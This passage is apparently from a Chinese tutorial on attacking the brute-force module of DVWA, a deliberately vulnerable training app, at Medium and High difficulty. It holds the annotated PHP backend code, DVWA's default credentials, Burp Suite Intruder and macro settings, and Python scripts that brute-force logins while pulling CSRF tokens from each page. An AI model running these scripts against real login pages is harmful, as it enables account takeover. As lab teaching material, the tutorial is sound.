class="line">        response = requests.get(url, params=params, cookies=cookies)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查响应</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Welcome to the password protected area&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 成功！用户名: <span class="subst">&#123;user&#125;</span>, 密码: <span class="subst">&#123;passwd&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] 失败: <span class="subst">&#123;user&#125;</span> / <span class="subst">&#123;passwd&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="DVWA默认账户"><a href="#DVWA默认账户" class="headerlink" title="DVWA默认账户"></a>DVWA默认账户</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">admin</span> / <span class="keyword">password</span></span><br><span class="line">gordonb / abc123</span><br><span class="line"><span class="number">1337</span> / charley</span><br><span class="line">pablo / letmein</span><br><span class="line">smithy / <span class="keyword">password</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>添加了基本防护，但仍可破解。</p>
<h3 id="后端代码分析-1"><a href="#后端代码分析-1" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否提交了登录请求</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户名</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取密码并MD5加密</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 新增：使用mysqli_real_escape_string转义特殊字符 ★★★</span></span><br><span class="line">    <span class="comment">// mysqli_real_escape_string() - 转义SQL语句中的特殊字符</span></span><br><span class="line">    <span class="comment">// 转义的字符包括：\x00, \n, \r, \, &#x27;, &quot;, \x1a</span></span><br><span class="line">    <span class="comment">// $GLOBALS[&quot;___mysqli_ston&quot;] - 全局数据库连接句柄</span></span><br><span class="line">    <span class="comment">// 作用：防止SQL注入攻击</span></span><br><span class="line">    <span class="comment">// 原理：将单引号&#x27;转义为\&#x27;，使其无法闭合SQL语句</span></span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))</span><br><span class="line">        ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> )</span><br><span class="line">        : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call!&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))</span><br><span class="line">        ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> )</span><br><span class="line">        : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call!&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建SQL查询（虽然转义了，但仍是字符串拼接）</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行查询</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> )</span><br><span class="line">        <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))</span><br><span class="line">        ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])</span><br><span class="line">        : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查登录结果</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// 登录成功</span></span><br><span class="line">        <span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ★★★ 核心防护：登录失败后延迟2秒 ★★★</span></span><br><span class="line">        <span class="comment">// sleep(2) - 使PHP脚本暂停执行2秒</span></span><br><span class="line">        <span class="comment">// 作用：减慢暴力破解速度</span></span><br><span class="line">        <span class="comment">// 计算：尝试1000个密码需要2000秒（约33分钟）</span></span><br><span class="line">        <span class="comment">// 缺点：只是延迟，无法真正阻止攻击</span></span><br><span class="line">        <span class="title function_ invoke__">sleep</span>( <span class="number">2</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出失败信息</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭数据库连接</span></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
<li><strong>mysqli_real_escape_string()</strong> - 防止SQL注入</li>
<li><strong>sleep(2)</strong> - 每次失败延迟2秒</li>
</ol>
<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><ol>
<li>仍使用GET请求</li>
<li>无账户锁定</li>
<li>无验证码</li>
<li>延迟可预测（固定2秒）</li>
<li>仍可暴力破解（只是变慢）</li>
</ol>
<h3 id="攻击步骤-1"><a href="#攻击步骤-1" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><p><strong>使用Burp Suite Intruder：</strong></p>
<p>Medium难度因为有2秒延迟，所以需要配置为单线程攻击。</p>
<p><strong>配置步骤（Burp Suite 2023版本）：</strong></p>
<ol>
<li><p><strong>基本步骤与Low难度相同</strong></p>
<ul>
<li>发送请求到Intruder</li>
<li>配置Positions（标记username和password）</li>
<li>配置Payloads（添加字典）</li>
</ul>
</li>
<li><p><strong>关键配置：在Settings标签中限制并发</strong></p>
<p>进入 <code>Intruder</code> → <code>Settings</code> 标签：</p>
<p><strong>方法A：使用Resource pool（如果你的版本有此选项）</strong></p>
<ul>
<li>找到 <code>Resource pool</code> 选项</li>
<li>点击 <code>Create new resource pool</code></li>
<li>设置 <code>Maximum concurrent requests: 1</code>（单线程）</li>
<li>原因：Medium有2秒延迟，多线程也需要等待，单线程更稳定</li>
</ul>
<p><strong>方法B：使用新版Burp Suite的Settings（2023及更新版本）</strong></p>
<p>如果你的Burp Suite没有Resource pool选项，使用以下配置：</p>
<ul>
<li>找到 <strong>“HTTP&#x2F;1 connection reuse”</strong> 部分</li>
<li>勾选 ✅ <code>Reuse HTTP/1 connections if the server supports it</code>（复用连接）</li>
<li>找到 <strong>“Redirections”</strong> 部分</li>
<li>根据需要设置重定向策略（通常选择 <code>Never</code>）</li>
<li>找到 <strong>“Error handling”</strong> 部分</li>
<li>设置 <code>Number of retries on network failure: 3</code></li>
<li>设置 <code>Pause before retry (milliseconds): 2000</code></li>
</ul>
<p><strong>重要说明：</strong></p>
<ul>
<li>Burp Suite 2023版本已经移除了单独的Resource pool配置</li>
<li>默认情况下，Burp会自动管理并发连接</li>
<li>由于Medium难度有2秒延迟，即使多线程，每个请求也会等待</li>
<li>因此不需要特别限制线程，Burp会自动优化</li>
</ul>
</li>
<li><p><strong>开始攻击</strong></p>
<ul>
<li>点击 <code>Start attack</code> 按钮</li>
<li>Burp会按顺序发送请求</li>
<li>每次失败会自动等待2秒（服务器端延迟）</li>
</ul>
</li>
</ol>
<p><strong>时间计算：</strong></p>
<ul>
<li>尝试100个密码 &#x3D; 200秒（约3分钟）</li>
<li>尝试1000个密码 &#x3D; 2000秒（约33分钟）</li>
</ul>
<p><strong>优化策略：</strong></p>
<ul>
<li>使用更精准的小字典</li>
<li>针对DVWA使用已知密码列表</li>
<li>晚上挂机运行</li>
</ul>
<p><strong>Burp Suite版本差异说明：</strong></p>
<table>
<thead>
<tr>
<th>功能</th>
<th>旧版本（2020及之前）</th>
<th>新版本（2023+）</th>
</tr>
</thead>
<tbody><tr>
<td>线程控制</td>
<td>Resource pool</td>
<td>自动管理</td>
</tr>
<tr>
<td>配置位置</td>
<td>Intruder → Options</td>
<td>Intruder → Settings</td>
</tr>
<tr>
<td>并发设置</td>
<td>Maximum concurrent requests</td>
<td>HTTP&#x2F;1 connection reuse</td>
</tr>
<tr>
<td>建议</td>
<td>手动设置为1</td>
<td>保持默认即可</td>
</tr>
</tbody></table>
<hr>
<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>添加了CSRF Token和随机延迟，难度大幅提升。</p>
<h3 id="后端代码分析-2"><a href="#后端代码分析-2" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否提交了登录请求</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 新增：CSRF Token验证 ★★★</span></span><br><span class="line">    <span class="comment">// checkToken() - DVWA自定义函数，验证CSRF token</span></span><br><span class="line">    <span class="comment">// 原理：对比用户提交的token和服务器session中存储的token</span></span><br><span class="line">    <span class="comment">// $_REQUEST - 包含$_GET、$_POST、$_COOKIE的内容</span></span><br><span class="line">    <span class="comment">// $_SESSION - 会话变量，存储在服务器端</span></span><br><span class="line">    <span class="comment">// 作用：防止跨站请求伪造(CSRF)攻击</span></span><br><span class="line">    <span class="comment">// 如果token不匹配，会重定向到index.php</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户名</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 新增：stripslashes()去除反斜杠 ★★★</span></span><br><span class="line">    <span class="comment">// stripslashes() - 删除由addslashes()或magic_quotes_gpc添加的反斜杠</span></span><br><span class="line">    <span class="comment">// 例如：\&#x27; 变成 &#x27;</span></span><br><span class="line">    <span class="comment">// 作用：清理输入数据</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$user</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mysqli_real_escape_string转义</span></span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))</span><br><span class="line">        ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> )</span><br><span class="line">        : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call!&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取密码并处理</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))</span><br><span class="line">        ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> )</span><br><span class="line">        : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call!&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行SQL查询</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> )</span><br><span class="line">        <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))</span><br><span class="line">        ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])</span><br><span class="line">        : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查登录结果</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// 登录成功</span></span><br><span class="line">        <span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// ★★★ 新增：随机延迟0-3秒 ★★★</span></span><br><span class="line">        <span class="comment">// rand(0, 3) - 生成0到3之间的随机整数（包含0和3）</span></span><br><span class="line">        <span class="comment">// sleep(rand(0, 3)) - 随机暂停0、1、2或3秒</span></span><br><span class="line">        <span class="comment">// 作用：使攻击者无法预测延迟时间，增加自动化攻击难度</span></span><br><span class="line">        <span class="comment">// 平均延迟：1.5秒</span></span><br><span class="line">        <span class="title function_ invoke__">sleep</span>( <span class="title function_ invoke__">rand</span>( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出失败信息</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭数据库连接</span></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 生成新的CSRF Token ★★★</span></span><br><span class="line"><span class="comment">// generateSessionToken() - DVWA自定义函数</span></span><br><span class="line"><span class="comment">// 作用：为每次页面加载生成新的随机token</span></span><br><span class="line"><span class="comment">// 这个token会被嵌入HTML表单的hidden字段中</span></span><br><span class="line"><span class="comment">// 示例：&lt;input type=&#x27;hidden&#x27; name=&#x27;user_token&#x27; value=&#x27;abc123...&#x27;&gt;</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
<li><strong>CSRF Token验证</strong> - 每次请求需要有效token</li>
<li><strong>stripslashes()</strong> - 额外输入过滤</li>
<li><strong>随机延迟</strong> - 0-3秒随机延迟（平均1.5秒）</li>
</ol>
<h3 id="仍存在的漏洞-1"><a href="#仍存在的漏洞-1" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><ol>
<li>仍使用GET请求</li>
<li>无账户锁定</li>
<li>Token可以被提取</li>
</ol>
<h3 id="攻击步骤-2"><a href="#攻击步骤-2" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><p>High难度的关键在于绕过CSRF Token验证。</p>
<h4 id="方法1：使用Burp-Suite的Macro功能"><a href="#方法1：使用Burp-Suite的Macro功能" class="headerlink" title="方法1：使用Burp Suite的Macro功能"></a>方法1：使用Burp Suite的Macro功能</h4><p><strong>步骤1：创建Macro获取Token</strong></p>
<ol>
<li>打开Burp Suite</li>
<li><code>Settings</code> → <code>Sessions</code> → <code>Session Handling Rules</code></li>
<li>点击 <code>Add</code></li>
<li>Rule Actions → <code>Add</code> → <code>Run a macro</code></li>
<li>点击 <code>Add</code> 创建新Macro：<ul>
<li>名称：Get CSRF Token</li>
<li>从Proxy History中选择访问brute force页面的GET请求</li>
<li>点击 <code>Configure item</code></li>
<li>添加Custom parameter location</li>
<li>Parameter name: <code>user_token</code></li>
<li>使用正则提取：<code>name=&#39;user_token&#39; value=&#39;([^&#39;]+)&#39;</code></li>
</ul>
</li>
</ol>
<p><strong>步骤2：配置Session Handling</strong></p>
<ol>
<li>在Rule中启用 “Update only the following parameters”</li>
<li>添加 <code>user_token</code></li>
<li>Scope → Include all URLs</li>
</ol>
<p><strong>步骤3：开始Intruder攻击</strong></p>
<p>现在每次请求前都会自动获取新的token。</p>
<h4 id="方法2：Python脚本自动获取Token"><a href="#方法2：Python脚本自动获取Token" class="headerlink" title="方法2：Python脚本自动获取Token"></a>方法2：Python脚本自动获取Token</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置</span></span><br><span class="line">url = <span class="string">&quot;http://dvwa.local/dvwa/vulnerabilities/brute/&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;security&#x27;</span>: <span class="string">&#x27;high&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;你的session&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">usernames = [<span class="string">&#x27;admin&#x27;</span>]</span><br><span class="line">passwords = [<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;letmein&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_token</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;获取CSRF token&quot;&quot;&quot;</span></span><br><span class="line">    response = requests.get(url, cookies=cookies)</span><br><span class="line">    <span class="comment"># 使用正则表达式提取token</span></span><br><span class="line">    match = re.search(<span class="string">r&quot;name=&#x27;user_token&#x27; value=&#x27;([^&#x27;]+)&#x27;&quot;</span>, response.text)</span><br><span class="line">    <span class="keyword">if</span> match:</span><br><span class="line">        <span class="keyword">return</span> match.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴力破解</span></span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> usernames:</span><br><span class="line">    <span class="keyword">for</span> passwd <span class="keyword">in</span> passwords:</span><br><span class="line">        <span class="comment"># 每次请求前获取新token</span></span><br><span class="line">        token = get_token()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] 无法获取token&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构建请求参数（包含token）</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: user,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: passwd,</span><br><span class="line">            <span class="string">&#x27;Login&#x27;</span>: <span class="string">&#x27;Login&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;user_token&#x27;</span>: token</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 发送请求</span></span><br><span class="line">        response = requests.get(url, params=params, cookies=cookies)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查结果</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Welcome to the password protected area&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 成功！<span class="subst">&#123;user&#125;</span> / <span class="subst">&#123;passwd&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        